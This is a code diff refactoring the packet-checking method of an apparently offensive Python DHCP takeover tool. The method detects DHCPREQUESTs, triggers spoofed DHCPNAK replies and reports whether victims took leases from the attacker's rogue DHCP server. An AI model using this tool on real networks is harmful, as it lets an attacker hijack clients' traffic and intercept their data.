@@ -66,33 +66,27 @@ class DHCP_takeover:
     # Detecting DHCPREQUEST packets and ARP packets.
     def check_dhcp_and_arp(self, packet):
 
-        try:
-            if packet[DHCP] and packet[DHCP].options[0][1] == 3:
-                print "DHCPREQUEST detected from %s" %  packet[Ether].src
-                self.macs[packet[Ether].src] = 0
+        if DHCP in packet and packet[DHCP].options[0][1] == 3:
+            print "DHCPREQUEST detected from %s" %  packet[Ether].src
+            self.macs[packet[Ether].src] = 0
 
-                if self.attempted_dhcpnaks.has_key(packet[Ether].src) == False:
-                    self.attempted_dhcpnaks[packet[Ether].src] = 0
+            if self.attempted_dhcpnaks.has_key(packet[Ether].src) == False:
+                self.attempted_dhcpnaks[packet[Ether].src] = 0
 
-                if self.attempted_dhcpnaks[packet[Ether].src] < self.nak_limit:
-                    self.attempted_dhcpnaks[packet[Ether].src] += 1
-                    self.nak_request(packet)
-                else:
-                    print "Giving up on spoofing DHCPNAK's for %s, failed" % packet[Ether].src
-                    del self.attempted_dhcpnaks[packet[Ether].src]
-        except IndexError:
-            pass
+            if self.attempted_dhcpnaks[packet[Ether].src] < self.nak_limit:
+                self.attempted_dhcpnaks[packet[Ether].src] += 1
+                self.nak_request(packet)
+            else:
+                print "Giving up on spoofing DHCPNAK's for %s, failed" % packet[Ether].src
+                del self.attempted_dhcpnaks[packet[Ether].src]
 
-        try:
-            if packet[ARP] and packet[ARP].op == 0x0002:
-                if self.macs.has_key(packet[Ether].src) == True:
-                    if packet[ARP].hwdst == self.our_dhcp_server_mac:
-                        print "Succes: DHCP client %s obtained a lease for %s from our DHCP server" % (packet[ARP].hwsrc, packet[ARP].psrc)
-                    elif packet[ARP].hwdst in self.other_dhcp_servers:
-                        print "Failure: DHCP client %s obtained a lease for %s from another DHCP server" % (packet[ARP].hwsrc, packet[ARP].psrc, )
-                    del self.macs[packet[Ether].src]
-        except IndexError:
-            pass
+        if ARP in packet and packet[ARP].op == 0x0002:
+            if self.macs.has_key(packet[Ether].src) == True:
+                if packet[ARP].hwdst == self.our_dhcp_server_mac:
+                    print "Succes: DHCP client %s obtained a lease for %s from our DHCP server" % (packet[ARP].hwsrc, packet[ARP].psrc)
+                elif packet[ARP].hwdst in self.other_dhcp_servers:
+                    print "Failure: DHCP client %s obtained a lease for %s from another DHCP server" % (packet[ARP].hwsrc, packet[ARP].psrc, )
+                del self.macs[packet[Ether].src]
 
 
     def takeover(self):
